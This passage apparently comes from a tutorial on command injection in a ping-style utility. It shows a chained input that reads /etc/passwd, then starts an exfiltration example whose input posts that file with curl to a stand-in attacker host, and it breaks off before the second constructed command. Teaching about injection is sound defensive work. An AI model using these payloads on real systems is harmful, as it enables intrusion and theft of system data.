```

**Constructed Shell Command:**  
```bash
ping -c 4 127.0.0.1; cat /etc/passwd
```

**What happens:**  
- The shell runs `ping -c 4 127.0.0.1` first.  
- After ping finishes, it runs `cat /etc/passwd` and outputs the password file.

---

### 2. Exfiltration via `curl` (POST to attacker server)

**User Input:**  
```
127.0.0.1 && curl -X POST --data-binary @/etc/passwd http://attacker.example.com/exfil
```

**Constructed Shell Command:**  
